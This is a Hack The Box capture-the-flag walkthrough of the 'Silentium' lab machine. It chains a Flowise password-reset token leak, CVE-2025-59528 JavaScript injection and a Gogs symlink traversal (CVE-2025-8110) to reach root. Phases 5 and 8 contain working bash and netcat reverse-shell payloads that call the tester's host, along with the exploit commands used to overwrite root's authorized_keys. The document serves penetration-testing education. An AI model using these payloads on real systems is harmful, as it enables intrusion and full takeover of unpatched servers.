# Hack The Box - Silentium Machine Walkthrough

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux)
![CVE-2025-59528](https://img.shields.io/badge/CVE--2025--59528-RCE-red?style=for-the-badge)
![CVE-2025-8110](https://img.shields.io/badge/CVE--2025--8110-PathTraversal-red?style=for-the-badge)
![Info Disclosure](https://img.shields.io/badge/Info%20Disclosure-Password%20Reset-orange?style=for-the-badge)
![Docker Escape](https://img.shields.io/badge/Docker-Container%20Escape-purple?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)

---

## 📋 Table of Contents

- [Machine Information](#machine-information)
- [Executive Summary](#executive-summary)
- [Phase 1: Reconnaissance](#phase-1-reconnaissance)
- [Phase 2: Web Enumeration & Subdomain Discovery](#phase-2-web-enumeration--subdomain-discovery)
- [Phase 3: Flowise — Version Identification & Vulnerability Research](#phase-3-flowise--version-identification--vulnerability-research)
- [Phase 4: Authentication Bypass — Password Reset Info Disclosure](#phase-4-authentication-bypass--password-reset-info-disclosure)
- [Phase 5: RCE via CVE-2025-59528 — CustomMCP Node Injection](#phase-5-rce-via-cve-2025-59528--custommcp-node-injection)
- [Phase 6: Docker Container Escape — Credential Harvesting](#phase-6-docker-container-escape--credential-harvesting)
- [Phase 7: User Flag Acquisition](#phase-7-user-flag-acquisition)
- [Phase 8: Privilege Escalation via CVE-2025-8110 — Gogs Symlink Traversal](#phase-8-privilege-escalation-via-cve-2025-8110--gogs-symlink-traversal)
- [Flags Obtained](#flags-obtained)
- [Lessons Learned](#lessons-learned)
- [References](#references)

---

## Machine Information

| Parameter | Value |
|-----------|-------|
| Name | Silentium |
| Difficulty | Easy |
| Operating System | Ubuntu Linux 24.04 |
| Machine IP | 10.129.29.143 |
| Open Ports | 22 (SSH), 80 (HTTP) |
| Platform | Hack The Box — Season Machine |
| Total Time | ~6 hours (including research and debugging) |

---

## Executive Summary

Silentium is an HTB Easy machine themed around a fictional institutional finance firm. Despite its Easy rating, it requires chaining four distinct vulnerabilities across two separate services — Flowise (an AI agent platform) and Gogs (a self-hosted Git service) — plus a Docker container escape via credential harvesting from environment variables.

**Attack chain summary:**

1. **Virtual host enumeration** reveals `staging.silentium.htb` running Flowise 3.0.5
2. **Information Disclosure** in the password reset API exposes the `tempToken` directly in the HTTP response, bypassing email delivery entirely
3. **CVE-2025-59528** — RCE via CustomMCP node JavaScript injection in Flowise, executed through a `sh` + `nc` reverse shell (bash not available in the container)
4. **Docker container escape** via environment variables containing SSH credentials
5. **CVE-2025-8110** — Gogs symlink traversal in the PutContents API overwrites `/root/.ssh/authorized_keys`, granting SSH access as root

---

## Phase 1: Reconnaissance

### 1.1 VPN Setup

```bash
sudo openvpn ~/Downloads/lab_aspri.ovpn
```

Verify connectivity:

```bash
ping 10.129.29.143
```

### 1.2 Port Scan

```bash
nmap -p- --min-rate 1000 -T4 10.129.29.143
```

**Initial output:**

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

**Service version scan on discovered ports:**

```bash
nmap -sV -sC -p 22,80 10.129.29.143
```

**Key results:**

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.6p1 Ubuntu |
| 80 | HTTP | nginx 1.24.0 (Ubuntu) |

**Analysis:** Only two ports exposed. Port 80 is the primary attack surface. The nginx version and Ubuntu fingerprint are noted for later use.

### 1.3 Add Domain to /etc/hosts

Browsing to `http://10.129.29.143` redirected to `silentium.htb` — a virtual host configuration requiring a DNS entry:

```bash
echo "10.129.29.143 silentium.htb" | sudo tee -a /etc/hosts
```

**Why?** Without this entry, the browser sends `Host: 10.129.29.143` in the HTTP header, and nginx serves no matching virtual host.

---

## Phase 2: Web Enumeration & Subdomain Discovery

### 2.1 Main Site Analysis

Browsing to `http://silentium.htb` revealed a static corporate site for a fictional institutional finance firm. Key observations from source code inspection:

- Three team members listed: **Marcus Thorne**, **Ben** (Head of Financial Systems — notably listed with only a first name), **Elena Rossi**
- Two JavaScript files: `/assets/styles.css` and `/assets/app.js`
- No CMS fingerprints visible

Reviewing `app.js` confirmed it contained only frontend logic (calculator, navbar scroll). No hidden endpoints or API routes.

**Decision:** "Ben" with no surname is a CTF hint — likely a username. Filed for later use.

### 2.2 Directory Fuzzing

```bash
gobuster dir -u http://silentium.htb \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,js,txt \
  --exclude-length 8753
```

**Note:** Initial run without `--exclude-length` failed because the server returned HTTP 200 for non-existent paths (soft 404). The `--exclude-length 8753` flag filtered responses matching the generic error page size.

**Result:** Only `/assets/` directory found — no meaningful attack surface on the main domain.

### 2.3 Virtual Host Enumeration

```bash
gobuster vhost -u http://silentium.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

**Discovery:**

```
staging.silentium.htb   Status: 200   [Size: 3142]
```

Add to hosts:

```bash
echo "10.129.29.143 staging.silentium.htb" | sudo tee -a /etc/hosts
```

**Why subdomain enumeration matters:** Virtual hosting allows a single server to serve multiple domains. This is common in CTF environments and real-world deployments where staging/dev environments share infrastructure with production but are not linked from public pages.

---

## Phase 3: Flowise — Version Identification & Vulnerability Research

### 3.1 Flowise Discovery

Browsing to `http://staging.silentium.htb` revealed **Flowise** — an open-source AI agent builder platform — presenting a login page.

Version enumeration via public API endpoint (no authentication required):

```bash
curl -s http://staging.silentium.htb/api/v1/version
```

```json
{"version":"3.0.5"}
```

### 3.2 CVE Research

With version 3.0.5 confirmed, CVE research yielded two critical vulnerabilities:

| CVE | Type | CVSS | Affects | Authenticated |
|-----|------|------|---------|---------------|
| CVE-2025-59528 | RCE via CustomMCP JS injection | 10.0 | ≤ 3.0.5 | Yes (API key sufficient) |
| CVE-2025-59527 | SSRF via `/api/v1/fetch-links` | 7.5 | ≤ 3.0.5 | Yes |

**Note on AI-assisted research:** Initial CVE research via ChatGPT produced a mix of real and fabricated CVE IDs. CVE-2025-59528 and CVE-2025-59527 were confirmed via NVD and GitHub Security Advisories. Other CVE IDs provided (CVE-2025-61913, CVE-2025-34267, CVE-2025-61687) could not be verified and were discarded. **Always validate CVEs against NVD or official advisories before attempting exploitation.**

**CVE-2025-59528 Root Cause:** The `CustomMCP` node in Flowise processes user-provided MCP server configuration strings through a `convertToValidJSONString` function that passes input directly to JavaScript's `Function()` constructor — functionally equivalent to `eval()`. Since Flowise runs as a Node.js application, injected code executes with full Node.js runtime privileges, including access to `child_process` and `fs` modules.

**Attack plan:** Authenticate to Flowise → obtain API key → exploit CVE-2025-59528 for RCE.

---

## Phase 4: Authentication Bypass — Password Reset Info Disclosure

### 4.1 Initial API Probing

Before exploiting the RCE, authentication was required. The Flowise login page prompted for email and password. A password reset flow was also available at `/forgot-password`.

First curl attempt against the forgot-password API:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb"}'
```

**First Attempt (FAILED):**

```json
{"statusCode":500,"success":false,"message":"Cannot read properties of undefined (reading 'email')","stack":{}}
```

The error persisted regardless of the field name used (`email`, `username`, `name`). This suggested the server was attempting to read `req.user.email` (a property of an authenticated session object) rather than `req.body.email` — meaning the endpoint might require a specific header to process correctly.

### 4.2 Discovery: x-request-from Header

Intercepting the browser's actual request via Firefox DevTools (Network tab) while submitting the forgot-password form revealed a critical difference:

```
x-request-from: internal
```

This header was not present in the curl attempts. The server used it to distinguish requests from the frontend application versus external clients.

**Second Attempt — with correct header (SUCCESS):**

The browser returned HTTP 201 with the full user object in the response body:

```json
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "tempToken": "pjYlFyEU7GU7N9MYNiVTiE3EohCrHUss3nUnkRd7zg8CC7eYHQmSma2I2iHzEXP7",
    "tokenExpiry": "2026-04-11T23:35:37.214Z",
    "credential": "$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8..."
  }
}
```

**The `tempToken` — intended to be delivered only via email — was exposed directly in the API response.** This is a critical information disclosure vulnerability: any unauthenticated attacker who knows a valid email address can reset any user's password without access to their inbox.

### 4.3 Password Reset

Using the exposed token, the password was reset via the UI at `/reset-password`:

- Email: `ben@silentium.htb`
- Token: `pjYlFyEU7GU7N9MYNiVTiE3EohCrHUss3nUnkRd7zg8CC7eYHQmSma2I2iHzEXP7`
- New Password: `Papasdelimon1.`

Login to Flowise succeeded. The API key was then retrieved from **Settings → API Keys**:

```
hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc
```

Verified authentication:

```bash
curl -s http://staging.silentium.htb/api/v1/chatflows \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc"
```

```json
[]
```

Empty array — authenticated successfully.

---

## Phase 5: RCE via CVE-2025-59528 — CustomMCP Node Injection

### 5.1 Initial Exploitation Attempts — curl (FAILED)

With the API key obtained, multiple attempts were made to trigger RCE directly via the `/api/v1/node-load-method/customMCP` endpoint using the IIFE payload from the official GitHub Security Advisory (GHSA-3gcm-f6qx-ff7p):

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"id > /tmp/pwned.txt\");return 1;})()})"
    }
  }'
```

**Result (repeated across all variants):**

```json
[{"label":"No Available Actions","name":"error","description":"No available actions, please check your API key and refresh"}]
```

This error was consistent regardless of payload content, suggesting the issue was not the payload itself but how the endpoint was being triggered. After extensive debugging, the curl-based approach was abandoned in favor of the Flowise UI.

### 5.2 UI-Based Exploitation

The CustomMCP node is designed to be used within a Chatflow canvas. Creating the exploit via the UI:

1. Navigate to **Chatflows → Add New**
2. Add a **Custom MCP** node to the canvas
3. In the **MCP Server Config** field, paste the payload

**First UI payload attempt — bash reverse shell (FAILED):**

```json
{
  "mcpServers": {
    "pwn": {
      "command": "node",
      "args": [
        "-e",
        "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.15.77/4444 0>&1\"')"
      ]
    }
  }
}
```

Clicked the **Available Actions** refresh button (🔄). Listener received no connection.

**Why it failed:** `bash` is not installed in the Flowise Docker container. This was later confirmed when we obtained the shell — the container runs Alpine Linux with only `sh` available.

This was identified through community help: *"Anything including bash won't work for reasons that will become apparent when you get the reverse shell."*

### 5.3 Successful Exploitation — sh + nc Payload

**Key insight:** Use `sh` instead of `bash`, and `nc` (netcat) with the `-e` flag for the reverse shell.

Set up listener:

```bash
nc -lvnp 4444
```

Create payload file to avoid shell escaping issues:

```bash
cat > /tmp/payload.json << 'EOF'
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"sh -c 'nc 10.10.15.77 4444 -e /bin/sh'\");return 1;})()})"
  }
}
EOF

curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d @/tmp/payload.json
```

**Shell received:**

```
connect to [10.10.15.77] from (UNKNOWN) [10.129.29.143] 35821
```

```bash
id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon)...
whoami
root
```

We are root — but inside a **Docker container**, not the host system. The container runs Flowise as root by default, which explains the uid=0 with no flags available.

---

## Phase 6: Docker Container Escape — Credential Harvesting

### 6.1 Container Identification

```bash
hostname
# c78c3cceb7ba

cat /etc/hosts
# 172.18.0.2    c78c3cceb7ba
```

The hostname and internal IP confirmed a Docker container environment. No flags were present — the host system was the target.

### 6.2 Environment Variable Enumeration

```bash
env
```

**Critical findings:**

```
FLOWISE_PASSWORD=F1l3_d0ck3r
FLOWISE_USERNAME=ben
SMTP_PASSWORD=r04D!!_R4ge
SMTP_HOST=mailhog
SENDER_EMAIL=ben@silentium.htb
```

Two passwords extracted from environment variables:
- `F1l3_d0ck3r` — Flowise application password
- `r04D!!_R4ge` — SMTP password (potentially reused for SSH)

### 6.3 Pivoting to Host via SSH

Verified SSH port accessibility from inside the container:

```bash
nc -zv 172.18.0.1 22
# 172.18.0.1 (172.18.0.1:22) open
```

SSH client was not installed in the container, so connection was made from Kali directly:

**First Attempt — FLOWISE_PASSWORD (FAILED):**

```bash
ssh ben@10.129.29.143
# Password: F1l3_d0ck3r
# Permission denied
```

**Second Attempt — SMTP_PASSWORD (SUCCESS):**

```bash
ssh ben@10.129.29.143
# Password: r04D!!_R4ge
# Welcome to Ubuntu 24.04.4 LTS
ben@silentium:~$
```

**Why it worked:** The `SMTP_PASSWORD` (`r04D!!_R4ge`) was reused as the system account password for `ben`. Password reuse across services is a common misconfiguration, especially in containerized environments where credentials are passed via environment variables.

---

## Phase 7: User Flag Acquisition

```bash
cat ~/user.txt
# 354bd52382084d1be9eb6c0a2d7593d1
```

✅ **User flag captured.**

---

## Phase 8: Privilege Escalation via CVE-2025-8110 — Gogs Symlink Traversal

### 8.1 Post-Exploitation Enumeration

Standard privilege escalation checks:

```bash
sudo -l
# Sorry, user ben may not run sudo on silentium.
```

```bash
find / -perm -4000 -type f 2>/dev/null
# Standard SUID binaries only — no unusual entries
```

```bash
ss -tlnp
```

**Interesting internal ports:**

| Port | Service |
|------|---------|
| 3001 | Unknown (internal only) |
| 8025 | MailHog web UI |
| 1025 | MailHog SMTP |

```bash
ls /opt/
# containerd  gogs
```

**Gogs** — a self-hosted Git service — was running internally. Port 3001 confirmed:

```bash
curl -s http://127.0.0.1:3001 | grep -i "gogs"
# <meta name="author" content="Gogs" />
```

The Gogs config revealed critical information:

```bash
cat /opt/gogs/gogs/custom/conf/app.ini
```

```ini
RUN_USER = root
HTTP_PORT = 3001
ROOT_PATH = /root/gogs-repositories
```

**Gogs runs as root.** Any code execution within Gogs translates to root-level access on the host.

### 8.2 CVE-2025-8110 Research

```bash
curl -s http://127.0.0.1:3001 | head -5
```

The Gogs version was identified as ≤ 0.13.3 (confirmed by the JS hash in the HTML). CVE-2025-8110 was applicable:

**CVE-2025-8110 Root Cause:** Gogs allows symbolic links to be committed to repositories (standard Git behavior). The `PutContents` API endpoint writes file content through a provided path without validating whether that path resolves through a symlink to a location outside the repository. An attacker can commit a symlink pointing to any system file, then use the API to overwrite that file with arbitrary content. Since Gogs runs as root, this enables writing to any file on the system.

### 8.3 Port Forwarding

Gogs was only accessible from localhost. Port forwarding via SSH tunneled it to Kali:

```bash
ssh -L 8081:127.0.0.1:3001 ben@10.129.29.143
```

Gogs was now accessible at `http://127.0.0.1:8081`.

### 8.4 Account Registration

Gogs had open registration enabled (`DISABLE_REGISTRATION = false` in app.ini). Created a throwaway account:

- Username: `hacker`
- Email: `hacker@test.com`
- Password: `Hacker123!`

Generated API token via **Settings → Applications**.

### 8.5 Exploitation — Overwriting authorized_keys

```bash
# Generate SSH keypair
ssh-keygen -t ed25519 -f /tmp/rootkey -N ""

# Clone exploit
git clone https://github.com/3jee/CVE-2025-8110 /tmp/CVE-2025-8110
cd /tmp/CVE-2025-8110

# Execute exploit
python3 CVE-2025-8110.py \
  --url http://127.0.0.1:8081 \
  -u hacker -p 'Hacker123!' \
  --target-file /root/.ssh/authorized_keys \
  --content-file /tmp/rootkey.pub
```

**Output:**

```
[+] Logged in:   hacker
[+] API token:   2739348b...
[+] Repo:        poc_d6s758
[+] Symlink:     payload -> /root/.ssh/authorized_keys
[+] Write OK:    91 bytes -> target file
[+] Done — target file has been overwritten.
```

The exploit:
1. Created a repository `poc_d6s758`
2. Committed a symlink named `payload` pointing to `/root/.ssh/authorized_keys`
3. Used the PutContents API to write our SSH public key through the symlink
4. Gogs followed the symlink and overwrote the actual `authorized_keys` file as root

### 8.6 Root Access

```bash
ssh -i /tmp/rootkey root@10.129.29.143
# Welcome to Ubuntu 24.04.4 LTS
root@silentium:~#
```

```bash
cat /root/root.txt
```

✅ **Root flag captured.**

---

## Flags Obtained

| Flag | Location | Status |
|------|----------|--------|
| User Flag | `/home/ben/user.txt` | ✅ Obtained |
| Root Flag | `/root/root.txt` | ✅ Obtained |

---

## Lessons Learned

### 1. Always Intercept Browser Requests Before Manual curl

The password reset exploit was blocked for a long time because the curl attempts were missing the `x-request-from: internal` header. The browser sent this automatically; curl did not. Using Firefox DevTools to inspect the actual request would have saved significant time.

**Lesson:** When an API endpoint behaves differently from the browser vs. curl, always compare full request headers — not just the body.

### 2. Verify CVE Information Against Primary Sources

AI-generated CVE lists included fabricated CVE IDs alongside real ones. CVE-2025-59527 (SSRF) was initially dismissed because it appeared in a mix with invented IDs — it turned out to be real and was confirmed on NVD. Similarly, fabricated IDs like CVE-2025-61913 were treated as leads before being disproven.

**Lesson:** Always verify CVE IDs on NVD (`nvd.nist.gov`) or GitHub Security Advisories before investing time in exploitation attempts.

### 3. bash vs sh — Container Environments Matter

The reverse shell payload using `bash` consistently failed silently. The issue was that the Flowise container (based on a minimal Node.js image) does not include bash — only `sh`. Switching to `sh -c 'nc ... -e /bin/sh'` immediately produced a shell.

**Lesson:** In containerized environments, do not assume bash availability. Test with `sh` first. The minimal shell is almost always present.

### 4. Password Reuse Across Services Is a Real-World Issue

The SMTP password from the container's environment variables was also the SSH password for the `ben` system account. This is a realistic misconfiguration — environment variables are often treated as "internal" secrets without considering lateral movement scenarios.

**Lesson:** Environment variable enumeration should be a standard step in any container escape scenario.

### 5. The curl RCE Path Was Never Fully Resolved

The IIFE payload via curl consistently returned `No Available Actions` despite the API key being valid. The UI-based approach worked. This suggests the endpoint requires some internal Flowise state (e.g., an initialized node pool or specific session context) that is satisfied when triggered through the frontend but not when called directly. This was not fully diagnosed — something to investigate further.

### 6. Full Attack Chain

```
Port scan → nginx on 80
  → vhost enumeration → staging.silentium.htb
  → Flowise 3.0.5 identified
  → password reset info disclosure (tempToken in response)
  → credentials for ben → API key
  → CVE-2025-59528 via CustomMCP node (sh + nc payload)
  → Docker container shell as root
  → env vars → SMTP_PASSWORD reused as SSH password
  → SSH as ben → user.txt
  → internal port 3001 → Gogs running as root
  → SSH port forwarding → Gogs accessible
  → CVE-2025-8110 symlink traversal → overwrite authorized_keys
  → SSH as root → root.txt
```

---

## References

### CVEs

- [CVE-2025-59528](https://nvd.nist.gov/vuln/detail/CVE-2025-59528) — Flowise CustomMCP RCE
- [CVE-2025-59527](https://nvd.nist.gov/vuln/detail/CVE-2025-59527) — Flowise SSRF
- [CVE-2025-8110](https://nvd.nist.gov/vuln/detail/CVE-2025-8110) — Gogs Symlink Path Traversal
- [GHSA-3gcm-f6qx-ff7p](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p) — Flowise Official Security Advisory

### Exploit Repositories

```bash
git clone https://github.com/3jee/CVE-2025-8110
```

### Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service detection |
| gobuster | Directory and vhost enumeration |
| curl | API interaction and exploit delivery |
| nc (netcat) | Reverse shell listener and payload |
| ssh | Remote access and port forwarding |
| python3 | Running CVE-2025-8110 PoC |
| Firefox DevTools | Request inspection and header analysis |

---

*Documented by: Aspri*
*Date: April 2026*
*Status: ✅ COMPLETED (User Flag + Root Flag)*
